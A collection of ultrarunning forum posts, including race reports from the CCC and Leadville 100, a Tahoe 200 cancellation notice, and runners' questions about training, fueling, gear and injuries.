2) even more important, it seems that my favorite running shirts are getting messed up. Specifically the front right chest area. It doesn’t feel abnormal to my hands, but it seems that maybe the rubbing of the material on my shirts is running them raw, so to speak, right behind where the water bottle is. I don’t know if it’s an issue without the front water, but I feel that shouldn’t matter.

## Training

My qualifying races were from way back in 2017 and 2018 and I wasn't selected when I applied for 2020. Thanks to COVID, I had another chance to be selected in the lottery. I only really started to train for the race when I got in through the lottery in January.

I started with short daily runs in January, but I ramped up to 100km per week by May. I also went to Chamonix for a couple of weeks of proper training and I went hiking in the Alps.

I ran an ""easy"" 80km trial race with 1500m of elevation at the beginning of July, but I had to DNF because of tendinitis below my knee. I didn't want to waste my chance to participate in the CCC, so I dropped my mileage in July and did a bit of hiking in early August to try and make up for it.

Because I don't live anywhere near hills, I ran most mileage on pretty flat paths and roads. 

To give some perspective of my general running fitness, I run 19:30 for 5km and I did one 20km training run with 1300m of gain loss in 3:10.

## Pre-race

Of course, like everyone else in Chamonix, I was shocked and saddened to hear that a fellow runner died on the TDS course. The volunteers do so much to make the courses as safe as possible, but these races are still high in the Alps and can be dangerous. 

I raced the OCC at the UTMB in 2017 and finished in the top 600 out of 2000 starters, so I thought that I could finish the CCC in a similar position or in about 22 hours. My training and fitness was pretty similar. However, I was placed in the final, fifth wave of runners because I effectively don't have an ITRA ranking. This means that to reach my goal of finishing in 22 hours, I would need to pass more than 1,000 people, which is a serious challenge given that the whole race is primarily on steep, mountain single track.

I also had a couple of other disadvantages. My girlfriend was visiting family, so she couldn't be there in person to crew me (Crews are allowed at every big aid station from Lac Champex on). I also picked the wrong shuttle time from Chamonix, so I had to wake up 5 hours before my race started.

Basically, my training, injury status, crew, and sleep were all suboptimal for a race of this magnitude. 

## Race

**Start to Tête de la Tronche - 0km to 9km**

I started about 3/4 back in the last wave or behind roughly 1900 other runners. I did manage to pass a lot of people in the first kilometers of the race. I heard that there can be a long wait for the first climb and I was expecting the worst given that I was starting in the final wave. As expected, I spent a lot of time standing around and not moving - at least 45 minutes. However, this might have been beneficial because when I got to the top I felt fresh, even if I heard others wheezing around me.

**Tête de la Tronche to La Fouly - 9km to 40km**

The next section was downhill, flat and pretty fast, but the huge number of runners meant that it was easy to get caught up in a slowish line. Going uphill to Col Ferret meant another conga line, if not as bad as the first. I passed over 100 people between Col Ferret and Anouvaz alone.

Unfortunately, I was having stomach pain through this section and I was really not eating enough calories. At the first aid station in Bertone at 15km, I felt like I could barely eat and I didn't get much better by Anouvaz. Nevertheless, I passed more than 350 people total from the start when I reached La Fouly on the descent - the equivalent of nearly every single person in front of me in my wave.

**La Fouly to Lac Champex - 40km to 55km**

This downhill section flew by. I passed another 100 people and hit the half way point in 10 hours. In fact, I was only about 30 minutes behind schedule for a 22:00 hour finish at Lac Champex. However, on the short climb up to Lac Champex, I was starting to feel weak.

**Lac Champex to Trient - 55km to 70km**

People started suffering at Lac Champex, me included. I stopped for over 20 minutes here because I felt woozy and I called my girlfriend for moral support before I started the race at night. The continued lack of food caused me to absolutely struggle on the climb up to La Giete. When I finally reach the water station at La Giete, I sat down for another 20 minutes and ate as many calories as I could stomach. The medic came by and asked if I needed help. I was really showing it and quite a few people passed me here. I was now more than an hour behind 22 hour pace. 

Luckily eating gave me enough of a boost to get moving again and I actually passed a few people on the descent to Trient.

**Trient to Vallorcine - 70km to 81km**

I got sucked in at Trient and I stopped 30 minutes without realizing it. I put my headphones in to help distract myself when I left. The climb was still slow and I still wasn't eating enough, but I had convinced myself that it would be gravy once I reached the top. In Vallorcine, as soon as I sat down, my body told me to stop. I spent 20 minutes refueling here again, but I eventually got moving.

**Vallorcine to Chamonix - 83km to 100km**

Food to the rescue again. I got up and started moving toward the last big climb of the race. It's the most technical climb - lots of rocks and very steep. Nevertheless, I passed more people up the climb to Tête au Vents. My legs were absolutely destroyed on the descent down into Chamonix though. My lack of real hill training made it impossible to more than shuffle down the last kilometers from La Flègere into Chamonix. I lost all of the places I gained on the climb up.

The last kilometer in was fun because crowds were already out waiting for the first finishers of the UTMB.

## Post-race

Well, it didn't go as planned but I was more interested in finishing than anything anyway. I also don't have any blisters, black toenails, or new injuries, I just have a regular case of DOMS.

It's true what they say: Ultramarathons are eating competitions with some running thrown in.

Vaccine messed up training schedule - need advice,"Well, what the title says. I wanted to get the vaccine in the off-season because I was afraid of the side effects messing up my training, but I was given an appointment without being asked and didn't have much choice.

I was told it'd be a day off training after the shot but it has turned out to be not quite as peachy and (including the second dose next week, which I've been told will be even worse than the first) I'm looking at 4 of the 6 weeks of peak volume for this year gone down the drain.

What's the recommended way forward when the training plan has been significantly disrupted (Not just a single day when you are unable to train)? Do I continue from where I was pre-vaccine, peak later, then make the off-season shorter and postpone it another year? Ignore the missed weeks and try anyways?

Easy 100k but unprepared 2 wks out - what to work on?,"I signed up for a 100km run a few weeks ago (male, age 48) as I had a spare weekend in September, so I'm not really ready and wondered a couple of things at his late stage....

Quickly, my current state is that I ran a few 50k runs in 2019 but nothing further and nothing like that far since. I've done a few 40k runs this year in training but most are 10k. I've probably done no more than 20k a week total training for months (but cycle and gym a lot so not unfit in general)

The 50k is dead flat, easy off road - so.....do I spend the next 2 weeks trying to get some miles in or/and drop a few pounds? I'm around 220lbs so could get down 6 or 7 but can't focus on weight dropping if also doing higher miles.

Lastly, a ""slow"" jog for me is 5m30 km/per hr pace - going slower (when fresh) feels odd - so do I run the 100km by doing my  natural pace and adding in lots of walks to drop the overall average to make it sustainable - or run real slow?

My target is anywhere from 12-14 hrs at a wild guess? My 5k is 19m, my 10k is 42m, full marathon is about 3hr 40 (off road) so I slow over distance (due to weight I expect) my last FLAT 50k was 5hr20 in 2019.",ultrarunning,1629962647
2021 Tahoe 200 cancelled due to forest fires.,"Received the official notice via email. 

Dear Runners,

We had a long discussion with the USFS today. We have been waiting to hear from them after talks last week in regards to the Caldor Fire and forest closures. They have had several meetings about our event and about closures of National Forests around Lake Tahoe. We are so terribly sorry to say that we have been informed today that the race will not be allowed this year. There is no easy way to say this nor is there any way to lighten the blow. You have trained all year, this is your dream. We realize that you have put a lot into this event. It is a nightmare to have prepared so much and be left with so little. From the bottom of our hearts, we are sorry we could not do any more to make this happen. It is difficult as a racer and as organizers to be at the mercy of nature. This is our passion and we wish we could share it with you this year. 

It's heart wrenching to deliver this terrible news, but we hope that it gives some kind of closure and the opportunity to cancel travel plans or make new ones. After last year's cancellation due to COVID and now this year, we realize that this is two years now that many of you have waited to run this race and two years we have worked hard on our end to make it happen. This race requires a year of work from our entire team. This makes the blow even harder. 

Although we are all devastated to be missing the race this year, our hearts go out to the communities hit by the fire, to the many people who have lost their homes and livelihoods. To the courageous wildland firefighters and forest service risking their lives. As much as we hurt from the cancellation of the race, it can't compare to the losses being suffered by forest fires. Although we regret that the event will not be allowed, we understand that it is important to support the communities as they fight this fire. 

Part of our discussion with the USFS was how to mitigate this fire/smoke issue in future years? Even though last year was cancelled due to COVID, just two weeks later those same forests shut down due to fires as well. That makes two years in a row now that the forests in Tahoe have been closed for fires in September. With the support of the USFS we are planning to move the event permanently to June or early July. Those months are beautiful and green in the Tahoe Basin. Even though June can have lingering snow up high, it's usually mostly clear that time of year and snow does not close entire forests like fires do. Snow can more easily be rerouted around or run through and won't fill the air with dangerous particles. We will keep you informed on new dates and changes as we move forward.

Since hearing about the fire and discussing it with the USFS last week, we have been working on possible reroutes all weekend and week in order to hold the event in the case that it was allowed by local agencies and the smoke was to abate. Unfortunately, no reroutes will be allowed. We want to extend a big thank you to Phil Lowry for working with us on GIS and routes. We had a brilliant plan laid out that took many days and long conversations to develop. We wanted to be completely ready to put it into action if we got the OK from the USFS. 

We wanted to let you know as soon as possible. We will take some time to convene as a team and send you follow up details. We will be mailing out runner swag and merchandise in the next few weeks and we will want to make sure we have an accurate mailing address for you. Please stay tuned for further emails to confirm these items. You can check what address you have on file with Ultrasignup by logging into your ultrasignup account.  

Virtual Option for Racers to Earn their Finish on their Own
We realize it can in no way compare to the read deal Tahoe 200, however, we will be putting together details shortly so that you will still be able to run 200 miles, if you like, and still get your finish. Those who ""finish"" will be mailed their finisher awards. In typical virtual race style, you will pick your route, run it, upload your time and be mailed finisher awards. This will also allow athletes in the Triple Crown to complete the Triple despite the Tahoe 200 cancellation. Submissions will be reviewed and there will be some rules in regards to cut off time and route. We will keep in mind that cut off may need to be more generous as some of you may be running self supported or hillier/more technical routes. We will aim to get this all set up by next week.

Lastly, we want you to know that this decision did not come lightly to the USFS and every possibility we could imagine was explored over the past 6 days. We hope to hold the race in future years pre-fire season so moving to June will be a very positive change. We held the event for 6 years before COVID cancellation with no cancellations. We worry that with what seems like more and more fires in the area in late summer and fall that the September dates seem increasingly risky. We also believe that June or early July will showcase the incredible beauty and wildflowers of Lake Tahoe so that runners can really appreciate the area. 

Thank you for your patience over the past week and now as we work to sort out this emergency cancellation. Thank you for your understanding and kindness.",ultrarunning,1629951389

Today I rinced it, then let it soak for a few hours in water with Lysol Laundry additive (to kill bacterias), then let it dry outside.

Experienced barefoot runner seeking ultra advice.,"I'm a relatively experienced barefoot runner. I've ran 5- 6 marathons and one 50miler all in either barefeet or with very minimal shoes.
I've experimented with a few different brands of minimalist shoes without amazing success. 

I'm starting to realize that running completely barefoot isn't a practical option for me if I want to take my running to the next level. 

My goal with this post is to figure out what works for me by hearing what works for you and experimenting with it. 

I would love to hear what your experiences have been and what has worked for you; whether you wear highly supportive shoes, very minimalist shoes, or none at all.

How to link training blocks - 50 miler to 100 miler,"I’ll be running my first 50 miler at the end of October, and want to figure out how best to setup my training with a 100 miler next summer in mind. 

A little background:
I’ve been running consistently since the beginning of 2018, and had a few years of lots of hiking before that. I ran my first road marathon in early in 2019, and a 50k that summer. That was a solid year of training that had good results. 2020 was hit and miss while figuring out shin splint issues and generally running very sporadically. I’ve been consistently running all of 2021 and am currently doing 45-60 MPW training for the 50 miler. 

My ultimate goal has always been to race a 100 miler. My goal is just to finish; I’m not speedy or looking to compete. My idea is to run a 100k around February - April next year, and then the 100 miler mid to late summer (haven’t targeted specific races yet). 

Does it make sense to recover from my October 50 miler, and go straight into another training block for the 100k? And then I can take a concentrated 6 months to prepare for the 100 miler? I’m running more than I ever have now, and just don’t want to overload myself. But I feel with a whole year basically to train I can be in a good position to tackle 100 miles.",ultrarunning,1629832979
Target Heart Rate For First Ultramarathon?,"I'm doing my first 50K in October. It'll be a fairly flat looped trail course. For my training, I've been doing 80/20 endurance style workouts, so LOTS of zone 2 work (\~150 bpm). 

My goal is to finish sub-5 hours (or a 9:39/mi pace).

When I'm fresh, my zone 2 heart rate is around 9:30 a mile, however, my HR increases over time as I get into runs of 10+ miles. I could see my pace bleeding out into \~10:15/mi during the ultra.

**All that to say, I don't think running at my Zone 2 pace will get me to my desired time for the race. At what point in the race should I kick it up to a threshold pace? The last hour?**",ultrarunning,1629826733

I’m going to have a lot of time on feet trying to chase elevation gain during the 50k training Bc I live in a relatively “flat” area and was wondering/thinking that could transfer over to prepare for a 100 miler relatively soon but that could also be stupid….but if it isn’t too stupid I still may do it.

Pre race calories,"I've been reading a lot of posts lately and also have a few friends that before their ultras they have a little bit of oatmeal, maybe with some pb or a banana,  and maybe a piece of toast with coffee on the side.  After seeing these tiny meals, I shake my head in confusion why they eat so little, then talk about how they fade from lack of energy.  I understand everyone is different and this might work for some people, but ever since I bonked at a marathon in my first year of running due to lack of calories, I always make sure I pack as many in as possible before a race.  If time allows I try to eat 2-3 hrs before each race.  I eat chocolate candy bars, pb, hamburgers, breakfast burritos...pretty much whatever my stomach can handle.  I try to get at least 1000 calories in before an ultra, and I stay on top of my calories during.  I have rarely had a problem since I started this.   
Not complaining, I'm just confused on how people eat so little when they want to run ultras.   Eating is the best part! During the race, I usually stick with stinger/scratch caffeine chews, easy to eat and digest.",ultrarunning,1629747981

Race Report: Leadville 100,"Race: Leadville 100, August 21-22

Goal: Sub 25 hours

Results: DNF at mile 87.5

Leading up to the race, I had a pretty solid summer. Averaging 70-80 miles/week with double weekend long runs, cumulating with a 30+20 double 4 weeks ago, with the last mile of the 20 in 5:57. I was also averaging 6-8k feet of climbing/week. 

I spent the summer trying out new shoes, clothes, packs, and nutrition, before settling on what I though was a race plan. 

Race day: Didn't sleep much at all (if at all) the night before. Woke up at 2:45, had my usual coffee and a tiny bit of oatmeal with peanut butter and got dropped off at the start line. Race went off. Legs felt a little jello-y from the start, but nothing I didn't think a few mile warmup would solve. 

6 miles in, my race plan fell apart. My nutrition was going to be Tailwind, stroopwafels, clif bars, and a gel during the run legs (depending what I was feeling at the time), and then pretzels and PB&amp;J at aid stations, along with a can of V8 before and after Hope Pass. All of these are things I had practiced eating on my long runs without issues this summer. An hour in, I had my first Stroopwafel, and my stomach started cramping up and feeling like I was going to puke. I got to the May Queen aid station, pulled out a Clif bar.... and the same thing. 

It turned out, my stomach couldn't handle solid foods at all. Improvising, I concentrated on just using Tailwind and the on-course Liquidy Gu gels. 

I got into Outward Bound (23.5) feeling mostly energetic, having run the first portion with a group that was aiming for the 23 hour mark, right around what I wanted. I wasn't overly concerned about nutrition at that point as I had thought I had adapted. 

I made my way into Twin Lakes outbound in 6:59 making some friends along they way -- My jello-y legs weren't feeling any better, or worse, but I could tell that I was getting hungry. My crew pulls out one of the soft pretzels I packed, I had 2 bites, and could barely swallow it. 

Off to Hope Pass I go. I'm not a great climber, but I could immediately feel the lack of energy (though to be fair, it's 40 miles into the race). I make my way up and over and down into Winfield. New this year (COVID), there is no crew or pacers in Winfield. I end up sitting in the station for around 15 minutes trying to refill by bag and drink from the drop bag I sent over. I was convinced to try the Ramen, which seemed to go down OK (ish). 

On the way back up Hope Pass, it started raining and hailing for 10 minutes. As I made my way over, I really regretted not bringing a headlamp. It was getting dark as Hope took way longer than planned. Made it back to Twin Lakes at 8PM, picked up my pacer, then was on the struggle bus. As it turned out, my improvised plan of Twilwind and Gu wasn't working anymore. I was getting sick of all the sugar. Stopping at the Half Pipe aid station, I tried to down a pretzel stick, but immediately started dry heaving. I was really starting to feel the effects of my caloric deficit. Made my way into the Pipeline crew point (72ish miles) feeling really drained and doing the walk-run shuffle. Someone had an idea to try Chocolate Milk -- which worked! My next 4ish miles back into Outward bound felt pretty solid and I was able to run about half of it. Picked up my next pacer and had a solid climb up the first part of Powerline --- then my second wind fell off a cliff. I had been trying to force myself to still take in the Gu's every hour.... but at that point, even they were making me sick and I almost vomited taking in my 3rd one that leg. Making my way down Powerline, I was running numbers -- Assuming I'd get into the last Aid Station at 5:30, that would leave me 4.5 hours to get in the remaining 12.5 miles -- and knowing that most of my later aid station stops were about 8-10 minutes as I tried to scarf down some Ramen, that would make it only 4:20, or roughly 21:00 miles. 

The issue became apparent though that I couldn't maintain that. As we hit the smooth flats and downhills coming off the Powerline climb, I was struggling to maintain 20:00 pace -- then we hit single track, and my pace dropped to 25-27:00 for the last 2 miles. That brought me into the aid station at 5:45ish - meaning that I would only have roughly 4:05 to run 12.5, or needing to maintain roughly 19:00 pace. While that didn't seem horrible, the issue is that there are 6ish miles worth of single track around the lake, which at the same rate of running the last few single track miles, I was going to miss the cutoff by 30-40 minutes. Compounded, I was unable to stomach any additional calories. 

At that point, I was mentally over. Given I had been struggling for almost 10 hours with an ever increasing caloric deficit since the start, couldn't consume any additional food without getting sick and realizing that I would have to have a significant ""3rd wind"" out of nowhere to even make the cut-off time based on the paces I was running the prior miles, I concluded that I was done. 

I cried. 7 months of training thrown out over something that I had zero control over. My last pacer tried to make me go, however I had a simple answer: At no point in the prior 20 miles had I averaged 19:00 pace or faster for more than 2-3 miles straight. To run that pace for 12.5 miles, half of which on somewhat technical single track and have a climb back into Leadville all while not being able to consume any additional calories wasn't going to happen. 

I won't lie - I think this will be my only 100. While I enjoyed many aspects of the race, the long training hours and lost weekends got between myself and my Fiancee, and frankly, to spend all the time, money and hours planning for it, only for something so simple to go wrong really put a bad taste in my mouth (pun intended). 

That said, I'm excited to check out some trail 50k's!",ultrarunning,1629669706
Running my first ultra - clueless about socks and shoes,"This November I will run my first ultra - it's an 8-hour event where the 'winner' is the person that runs the most loops, and each loop is 6 miles. 

Right now I've only run on roads and the treadmill, and run exclusively in Asics GT-1000/2000s. Starting in September I'll try to get a weekly run in on trails.

While I haven't seen the course, it's ""mostly groomed trails or dirt road"". Would I be able to use my normal running shoes for that? I don't have a ton of time to experiment, but I do know Asics has a (GT-2000 Trail Version)[https://www.asics.com/us/en-us/gt-2000-9-trail/p/ANA_1011B046-001.html?width=Standard], which is the GT-2000 with a different traction pattern. I'd be okay with spending $120 if it make the run pleasant.

I'm also curious about socks -  right now I use Puma short socks from Costco which are 100% cotton, I haven't had any issues until now even when hiking/running 4 hours. Should I try another sock that could be better for longer races?

What happened to my quads and why?,"I just had the most terrible experience at a race and I’m flabbergasted trying to understand what happened. I don’t even know what to type into Google or what doctor to ask so I’ll throw it out here to see what your opinions are.

I’m pretty fit right now and have had excellent training, so that is not the issue here. I am happy and healthy in regard to this race so it isn’t a mental issue. I was also hydrated and well fed starting the race, so that wasn’t it either.

I began the race (my first 100k) feeling good and moving. Right after I heard my watch click signaling the first mile, we went through a few nettles and I felt one get between the tongue of my shoe and the front of my ankle. Rather than ignore it and let it develop into an issue, I stepped to the side of the trail, bent over and removed it real quick. 

As soon as I stood up, my quads seized and cramped like nothing I’d ever experienced before. They swelled, started shaking and I could not walk, let alone run. My friend saw me and tried to help me keep going. He gave me salt to see if it was an electrolyte issue (it didn’t help) and then we tried pain reliever. Then he helped me aggressively massage my calves and pound them to get them to loosen. Nothing helped. I couldn’t sit down without doing a log roll on the ground. I hobbled to the aid station at mile 6 and was pulled off the course. My legs stopped seizing a couple hours later and I was able to move around better.

Today, I feel like I either did a massive leg day gym session or had a long downhill workout. My body and mind still feel fresh, but my quads are still sore. I’m getting the sense that the soreness will resolve in a few days with foam rolling and massage.

Any ideas as to what could have happened? I am still fit so most likely will do a race in a few weeks to get the most of this training cycle. But of all the things I thought would go wrong in this effort, quad cramps at mile 1 was not it.",ultrarunning,1629650043

Anyone else here running/training while dealing with ongoing chemo? How have you adjusted?,"I know this might be a bit of an unusual post. But I’ve been on chemo/immuno drugs for the past ~2 years now, along with a stem cell (aka bone marrow) transplant last year. But throughout working hard to keep my running up when I can. 

It’s hard to find people going through similar experiences and how they adjust and cope. Recovering from the more serious treatment aside (the SCT was about 6 months), the side effects from some of the drugs/drug combinations have played havoc with my max HR, overall HR, oxygen transport/breathing, recovery/sleep … not to mention overheating (even when the weather is cold). Training has had to change (along with my expectations). 

For me I’m managing lenalidomide, daratumuamb, and dexamethasone on a daily/weekly basis. Before all this I was running 3000-4000km per year and have done 15 marathons. Losing all that base was hard but I’m so far back up to over 1000km for the year so far. My easy pace before was around 5:45/km with average HR 140’ish bpm, now ~8:00/km at ~155bpm. Max HR changes depending on drugs and dosage, but can change from ~180bpm to 165bpm over the course of a month. It’s weird. 

I would love to hear other’s experiences and how you adjusted and changed in your training. And what you accomplished in spite of the challenges especially.

Underfueling on purpose in training.,"What is your opinion on this topic? Do you underfuel intentionally in your training?

I do all my  morning runs fasted without any breakfast and don't fuel on my long run, currently around 2h.At the end of most runs i can feel that my glycogen stores are pretty empty. During the week it is more about time efficiency, it just takes way less time to have the breakfast after my run. For the long run i just have my regular breakfast and then take no nutrition with me. Over time my body has adapted pretty well to the midweek fasted runs and my long run just gets a bit unpleasant towards the end, so i guess i'm still far away from bonking, but i still feel the lack of nutrition.

My rationale would be to improve fat burning and to get a feel for nutritional deficits, to be more sensitive. There is also some research done on this topic, it supposedly enhances the release of interleukin 6 and improves fat burning.

I would most likely limit this to workouts up to 2h and for everything above i would fuel during the run.",ultrarunning,1629560008

Long story short, I finished my first Ultra (a very technical 80km with 3600m d+) a week ago. It was also my first running race/event since I've been only running for a year and a half (im 25)... and my first time really running in trails. I finished in 17:10 since I know I spent way to much time at the 5 aid stations (between 15 minutes and 1h10).  I was the second to last male and within 50 minutes of the cutoff, therefore I'm wondering if I really ""deserve"" to say to myself that I ran an ultra since people can't probably walk faster than my pace.

Should I withdraw from my 50 miler?,"I'm just wondering if I picked a race that is too challenging for a first 50 and/or at my fitness level, and if I should step down to the 50k. Would love some outside thoughts. I'm working with a coach and running 40-50mpw with about half on trail. Everything was going great until pretty recently; I've struggled a little on some of my recent long runs, particularly yesterday, and on many runs my total time would be seriously pushing the cutoff time for my 50miler. 

On one hand, I've worked really hard for nearly a year with this 50 in mind. I'd be pretty disappointed to not try.  I don't want to waste my current fitness since I'm not sure what my long term plans are in running. I can stay on the course after the cutoff and still technically finish, even if I officially DNF. My coach says I'm ""fit enough to go for it"". On the other hand, I don't want to  spend the entire race day stressing about the cutoff which might take a fair amount of enjoyment out of the experience. I also really struggled yesterday on a peak long run and I do not want to feel that shitty during the race. Granted, that run came on the heels of an unusual week. 

I ran my first trail races this year. In February I ran a  marathon with 5500' of vert. I finished with a total time of 5:19:15. In May I ran my first ultra, a 50k with 7500' of vert and I finished with a total time of 7:13:57. In July I ran my 2nd 50k also with about 7k vert,  but a much more challenging course (technically and at elevation) and I finished with a total time of 8:02:02. 

Anyway, yesterday was  discouraging, but I have been working really hard. I would be disappointed to step down from 50 miles, but also proud to complete three 50k's in my first yet of ultra running so I'm struggling to make  the decision and I'm just looking for outside thoughts.

First 100 Mile race,"Hi Everyone, 

&amp;#x200B;

This weekend was my first ever 100mile race. What an experience it was!

I've only been running since June 2019 and ran my first marathon in June 2020.

When I started running I was quite overweight (30kg or 66 pounds) so I needed to shed the weight before running long distances and ramping up the milage.

&amp;#x200B;

The aim for the race was quite ambitious, me and a friend of mine headed out with the aim to run under 24hours. My friend had quite a bit more experience then me with long events (ran 100k and a couple of 50milers before) and my longest distance was 57k and longest time on feet was 8hours.

First hours where amazing, the weather was nice, we were right on pace even a bit faster then we expected and everything felt amazing. The only thing that was bothering me was my stomach didn't feel right but nothing serious. A bit later in the day temperatures increased quite a bit (26° Celsius or 78° Fahrenheit) and I felt it. I became quite hard to keep myself hydrated even with checkpoints every 20k and salt tablets. I sweat quite a lot when I run and the temperature in Belgium hasn't been this high in quite a few weeks.

Still I was feeling great up until 115km. It became dark and we went on the more technical part of the trail. I became very sleepy, couldn't focus anymore and some part I probably closed my eyes because 30meters or so went by without me remembering. My friend was struggling the first few hours but he improved the further the race went en kept me going. 

Then at about 138km there was a technical descent where I lost my friend and had to walk 7km to the next checkpoint where my friend waited for me. From those 7km I don't really remember anything, I was close to sleepwalking probably and It took forever because the terrain was quite technical and my body was really rebelling, stomach issues, legs where shot, feet really hurt etc but I managed to get there. 

Upon arriving at the checkpoint my friend waited for me a bit worried because he didn't expect me to be that far behind. I told him he should carry on without me because the only thing I could manage the last 16k was walking at a slow pace and I probably needed a powernap before I even wanted to set off. He did and really went for it managing to finish the last 16k in less then 2 hours and even ran his fasted km's of the race. I on the other hand slept for 20minutes before setting of and had to walk for a solid 4hours before finishing almost giving in to quit at 158km.

I finished in 28hours and 52 minutes and I am quite proud of it because I have the feeling that it was all I had in me that day! 

It was the hardest, most painful and probably the most fun experience in my life and can't wait to my next race! 

Hope you guys enjoyed this quick summary of my race(it's my first long post on reddit and English is not my native tongue!) If you have any questions feel free to ask! :)

Anyone have any experience returning to running after hernia surgery?,"Not asking for medical advice as I'm asking my doctor at my preop appt on the 23rd about the official return to training timeline. I'm wondering what other people's experiences are. I had a near death experience when I was in middle school and haven't had a surgery since so I'm overly anxious about it. As far as running goes, I'm worried I will re injure or that I will have issues beyond the typical 1 month timeline that will keep me from being able to run (running keeps me sane and the 30 days after the surgery are going to be horrible... I'm planning on logging as many miles walking as possible).

How much elevation work to squeeze into seven weeks?,"Hi gang,

I relatively recently moved across the country and found a sweet-sounding local 50K for October. I've done two pretty successful 50K's (my first two ever) in NY earlier this year, both ""fair"" in terms of elevation at ballpark 3500 feet gain each.

The upcoming race here in Oregon... has closer to 6500 feet! Here is it on Strava: [https://www.strava.com/routes/2859312322652041106](https://www.strava.com/routes/2859312322652041106)

I'd like to compete and do well (win? place? age division? depends on who shows up!) in the upcoming 50K. Seven weeks out isn't a ton of time, of course, but I'm hoping it's enough to leave me an opportunity for some improvement at hills. Any suggestions for how to structure my hill work, and how much of it to do? I do need to keep most of my runs truly local (starting/ending at home), but can access a couple different climbs anywhere from gradual stuff to rollers to a gnarly 500' gain in one mile. Getting out into more challenging trails can happen on the weekends.

In 1978, she ran across America in 69 daays and in 1980 ran the length of Britain in 16 days. Into her 80s she competed at International Masters Games. She is now 96 years old, living in Cape Town.

I've primarily run 5ks, 10ks, and half-marathons. Right now my mileage is 35MPW with a long run of 10-12 miles. 

A buddy of mine sucked me into running an ultra in early November, about 12 weeks away. The good news is that it's an 8-hour timed run on a 6.xx-mile loop and the winner is the person who runs the farthest. So I'm basically guaranteed to 'finish'.

50 milers with no cutoffs,"I'm an amateur runner who just completed my first 55k this year: the Beaverhead Endurance Run 55k in Salmon, ID.  I just started running religiously about 3-4 years ago, so I am relatively new to the sport.  As such, I'm pretty slow.  9 minute pace is pretty typical on my training runs, but I'm much slower on race day due to the types of races I enjoy (18-21 minute miles are my typical average).    

I try to compete in at least 2 trail races a year as motivation to continue my training year-round.  I prefer the ""mountain ultra"" style of trail race with extreme mountain ascents and descents.  These races seem to have a good mix of trail running, hiking, and beautiful mountain scenery that I enjoy.  Up to this point, I haven't had to worry too much about cutoff times.  Most of the races that I've competed in usually have a longer option (Beaverhead had a 100k, IMTUF had a 100 miler) that set the cutoffs.  I'd like to upgrade to my first 50 miler this year but I am struggling to find one that has easy enough cutoff times that I wouldn't have to stress about it.  For reference, my time in the Beaverhead 55k was 11:30 (34 miles, 6000 ft ascent, 9000 ft descent).  I live in Wyoming so preferably somewhere within a 6-8 hour drive.  Mountain ultra preferred.

Need replacement soft valves for Salomon flasks &amp; bladder,"I have leaky nipples...

I run with a Salomon Adv Skin 5L - two 500ml flasks and a 2L bladder. I clean and dry on a regular basis, and deep clean/sanitize on an as-needed basis. I've disassembled the bite valves to blast out built up debris. And this has served me well for the last several years...

But my kit is approaching 4 years. The bladder and soft flasks are in excellent conditions, but the valves are not holding seal. The pocket flasks take in air and start to get that 'swish' sound when I run. Worse yet, the bladder actively leaks from the valve at the end of the tube. My shirt gets soaked all the way down to the shorts. This level of water saturation opens the possibility of chafing... especially on my long, long runs.

Apparently Salomon sells replacement valves (though a bit costly TBH).

Factors for first 100…challenging vs “beginner friendly”?,"I am trying to decide between two races next spring for my first 100, and it really comes down to one being much more challenging (and potentially more exciting) and one being more “beginner friendly”
I’m looking at the Riverlands 100 in Maine (May) and Umstead in NC (April). Riverlands is within 3 hours drive from my house and the old school feel is appealing to me, but would present technical hilly terrain and possible weather issues. Umstead would be a long drive or a flight, but logistics seem easy and the looped course with smooth path might be a better introduction to the distance. Any thoughts from those with experience for either of these races? I guess another point is I’d be training through a Vermont winter, so much of my training miles for either race would be hilly pavement/dirt road depending on trail conditions in spring.

Running pack durability,"How long do a lot of your running packs/ vests last? I’ve had two different packs and they have lasted me two very different lengths of time. 

My Osprey Aura 6 has seen pretty hard us for 2.5 years between all my long runs and races. It’s held up really well. Some of the materials in the shoulder straps are just starting to fail but otherwise it’s been a great, well designed pack. My Raidlight Lazerdry 25 is a different story. 

I’ve only ran with the Lazerdry this season and mostly on my long runs. It’s got some pretty bad design issues. The water bladder sleeve is in the main compartment and started to tear when I put my sleeve in it the first time. It’s difficult to get it in and out to refill. Stuff tends to fall out of the side pockets. The side pockets are also starting to tear. The bottom zipper is starting to fail.

Zone 2 training for first 50K—am I doing it all wrong??,"
About me: 44F with 25 year history of recreational, middle-of-the-pack road running. 7 marathons (NYC, Chicago x 2, Boston x 3). 
PR’s:
Marathon 4:12 @ Boston
Half 1:55
10K 52:30
5K 23:18

Other possibly pertinent info: 5’6” 130 lb, training with Garmin instinct and Garmin HRM-pro chest strap

Recent backpacking trips evolved into fastpacking trips and ultimately to the realization that I love trail running way more than road running. Fast forward to present day, and my first 50K is 9 weeks away. http://pm2hrultras.com/details/  
My primary goal is to avoid a DNF. My secondary goal is to avoid a DFL finish, and my bonus goal is to finish in a respectable time.
For training, I started off with a modified marathon training program I’ve used before, but with more mileage. Meanwhile, I started reading everything I could find on the subject of ultrarunning/endurance and as a result, totally shifted my training approach from everything I’ve ever known and implemented—tempo runs, speed work, hill workouts and long runs—to 100% zone 2 training, as I soon discovered that I have aerobic deficiency syndrome as described in Training for the Uphill Athlete. And just like the book warns, this training has been frustrating and challenging, since I have been forced to run at what feels like a lethargically slow pace in order to keep my HR in zone 2. I’ve also been binging on the Science of Ultra podcast, and one statement Dr. Bearden made is “Easy runs are still runs; they’re not a shuffling jog.” Yet, in order to stay at or below my AeT, which according to Maffetone’s 180 formula is 136, that’s exactly what I am having to do: a shuffling jog. For example, last weekend, I ran 20 miles on a rail trail—a soft-packed, completely flat trail—and I had to shuffle-jog the whole thing in order to stay in zone 2. My first mile was a 10:44 pace and last mile was a crawling 14:51 pace! It was incredibly challenging to “run” that slowly, not to mention the effect on the ego, as less-fit folks were passing me left and right. My average pace for the whole 20 was 13:07 and average HR was 137. I was able to easily breathe out of my nose the entire 4 hours and 22 minutes. And when I go for trail runs, I am forced to run/walk, run/walk to stay in zone 2. I have so many questions about this approach, but the main three are as follows:
1. With my race being only 9 weeks away, how in the world will I be prepared for a 50K trail race with 3800ft elevation gain if all my training is at a snail’s pace on easy, flat surface? And how will I be prepared to run (or even power hike) the ups at a faster pace than which I am currently training?
